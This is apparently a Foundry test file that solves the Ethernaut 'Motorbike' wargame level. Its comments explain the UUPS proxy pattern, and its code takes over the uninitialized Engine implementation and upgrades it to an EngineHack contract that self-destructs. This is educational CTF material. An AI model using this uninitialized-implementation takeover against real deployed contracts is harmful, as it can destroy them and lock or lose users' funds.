// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/Motorbike/MotorbikeFactory.sol";
import "../src/Ethernaut.sol";
import "forge-std/console.sol";

contract MotorbikeTest is Test {
    Ethernaut ethernaut;
    address payable player = payable(address(100));

    function setUp() public {
        // create new instance of ethernaut
        ethernaut = new Ethernaut();
        vm.deal(player, 5 ether); // give our player 5 ether
    }

    function testMotorbikeHack() public {
        /****************
         * Factory setup *
         *************** */
        vm.startPrank(player);
        Engine engine = new Engine();
        Motorbike motorbike = new Motorbike(address(engine));
        Engine ethernautEngine = Engine(payable(address(motorbike)));

        /****************
         *    Attack     *
         *************** */
        /*
        !! Here the proxy pattern used is Universal Upgradeable Proxy Standard ( UUPS )
        * The way this proxy works is a bit different, the contract logic will also be
        *  coded in the implementation contract and not in the proxy contract
        *  This allows the user to save some gas !
        *
        * User (client browser) --> method()  -->   UpgradeabilityProxy  --> method() --> Logic Contract
        *                       <-- return data <--                      <-- return data <-
        *                                                   \\                             //
        *                                                           Storage Structure
        *                                  (stores the storage structure and is inherited by the proxy and logic contract)
        *
        * Another difference is that there is a storage slot defined in the proxy contract that stores
        *   the addres of the logic contract
        * Reference: https://eips.ethereum.org/EIPS/eip-1967
        *
        * On this challenge, we have once again uppgradable contracts
        * Here is the goal: Would you be able to selfdestruct its engine and make the motorbike unusable ?
        * In order to understand what's happening let's decompose the contracs:
        * This is updated every time the logic contract is upgraded
        *
        *
        * ** Motorbike ** [PROXY CONTRACT]
        *  _IMPLEMENTATION_SLOT This slot is storing the address of the implementation contract
        *
        * ** Engine ** [Implementation/logic]
        * We can see in this contract that there is no explicitely defined selfdestruct in this contract
        * The goal here would be to upgrade the implementation contract and point it to our deployed attacker contract
        *
        * In order to upgrade the contract there is a function defined called upgradeAndCall
        *   - first, it call the internal function _authorizeUpgrade which checks if the msg.sender == upgrader
        *   - then it calls the internal function _upgradeToAndCall
        *
        * How do we become the upgrader ?
        *   1) it's defined in the function initialize
        *   This is a special function used in UUPS-based contracts
        *   This function also has the initialized function, inherited from Initializable from openZeppelin
        *   It acts as a constructor which can only be called once
        *   Please also notice that this initialize function is called in the proxy contract's [MOTORBIKE] constructor
        * !! So it's made in the context of the Proxy and not in the Implementation
        *
        * Here is the walkthrough:
        * 1)initialise the engine
        * 2)initialize the engineHack contract
        * 3)encode the initialize function call --> engineHack become the upgrader as it is the msg.sender
        * 4)After that, we can call upgradeToAndCall that will trigger the selfDestruct
        */
        console.log(address(ethernautEngine).balance);
        // -- 1 --
        engine.initialize();
        // -- 2 --
        EngineHack engineHack = new EngineHack();
        // -- 3 --
        bytes memory initEncoded = abi.encodeWithSignature("initialize()");
        // -- 4 --
        engine.upgradeToAndCall(address(engineHack), initEncoded);
        /*****************
         *Level Submission*
         ***************  */
        assertEq(engine.upgrader(), player);
    }
}

contract EngineHack {
    function initialize() external {
        selfdestruct(payable(msg.sender));
    }
}
